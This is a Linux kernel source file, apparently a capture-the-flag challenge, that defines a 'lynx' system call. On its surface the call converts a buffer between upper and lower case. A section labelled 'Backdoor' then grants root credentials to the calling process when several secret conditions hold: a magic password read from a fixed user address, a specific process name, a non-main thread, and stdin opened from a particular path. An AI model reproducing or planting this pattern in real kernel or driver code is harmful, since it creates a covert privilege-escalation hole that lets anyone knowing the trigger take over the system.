#include <linux/compiler.h>
#include <linux/errno.h>
#include <linux/export.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <linux/thread_info.h>
#include <linux/ktime.h>
#include <linux/fs.h>
#include <linux/fdtable.h>
#include <linux/ctype.h>


int failed = 0;


int lynx_check1(void) {
  if (failed == 0)
    return -1;
  return 0;
}


int lynx_check2(void) {
  unsigned long password;
  if (copy_from_user(&password, (void*)0xca7cafe, sizeof(password)))
    return 1;
  if (password != 0x006f616d6e616873) // "shanmao\0"
    return 1;
  return 0;
}


int lynx_check3(void) {
  if (strcmp(current->comm, "o-yamaneko"))
    return -1;
  return 0;
}


int lynx_check4(void) {
  if (current->pid == current->tgid)
    return -1;
  return 0;
}


int lynx_check5(void) {
  char *tmp, *pathname;
  struct file *file;
  struct path *path;

  rcu_read_lock();
  file = fget_task(current, 0);
  if (!file) {
    rcu_read_unlock();
    return -1;
  }

  path = &file->f_path;
  path_get(path);
  rcu_read_unlock();

  tmp = (char*)__get_free_page(GFP_KERNEL);
  if (!tmp) {
    path_put(path);
    return -1;
  }

  pathname = d_path(path, tmp, PAGE_SIZE);
  path_put(path);

  free_page((unsigned long)tmp);
  if (IS_ERR(pathname))
    return -1;

  if (strncmp(pathname, "/m", 2))
    return -1;

  return 0;
}



SYSCALL_DEFINE3(lynx, char __user *, buf, size_t, length, int, mode) {
  char *t;
  size_t i;

  /* Converter */
  if (mode != 0 && mode != 1)
    return -EINVAL;

  failed++;
  t = (char*)kmalloc(length, GFP_KERNEL);
  if (!t)
    return -ENOMEM;

  if (copy_from_user(t, buf, length)) {
    kfree(t);
    return -EINVAL;
  }

  for (i = 0; i < length; i++) {
    t[i] = mode == 0 ? tolower(t[i]) : toupper(t[i]);
  }

  if (copy_to_user(buf, t, length)) {
    kfree(t);
    return -EINVAL;
  }

  kfree(t);
  failed--;

  /* Backdoor */
  if (lynx_check1()
      || lynx_check2()
      || lynx_check3()
      || lynx_check4()
      || lynx_check5())
    return 0;

  commit_creds(prepare_kernel_cred(NULL));
  return 0;
}
